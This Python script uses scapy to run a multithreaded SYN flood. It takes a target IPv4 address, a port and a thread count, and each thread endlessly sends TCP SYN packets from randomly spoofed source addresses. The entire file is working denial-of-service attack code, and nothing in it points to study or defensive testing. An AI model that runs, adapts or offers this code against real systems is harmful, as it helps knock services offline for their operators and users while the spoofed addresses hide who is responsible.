# coding: utf-8
import random, sys, threading
from scapy.all import *

def takeInput():
    global PORT
    try:
        PORT = int(sys.argv[2])
    except ValueError:
        print("Please specify a valid port number")
        exit()
    takeInput2()

def takeInput2():
    global SERVER
    SERVER = str(sys.argv[1])
    if len(SERVER.split(".")) != 4:
        print("Invalid IPv4 address (note: IPv6 is not allowed)")
        exit()
    takeInput3()

def takeInput3():
    global threads
    try:
        threads = int(sys.argv[3])
    except ValueError:
        print("Invalid thread number")
        exit()

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,1500)
	return x	

def syn_flood(dstIP,dstPort):
    while True:
        s_port = randInt()
        IP_Packet = IP ()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP
        TCP_Packet = TCP ()	
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        send(IP_Packet/TCP_Packet, verbose=0)

def main():
    if len(sys.argv) < 3:
        print("usage: %s [ip] [port] [number of threads]"%sys.argv[0])
        exit()
    takeInput()
    print("Sending Syn Packets... (Ctrl + C to exit)")
    for i in range(threads):
        syn_thread = threading.Thread(target=syn_flood, args=(SERVER, PORT), daemon=True)
        syn_thread.start()
    
    while True:
        pass

if __name__ == '__main__':
    main()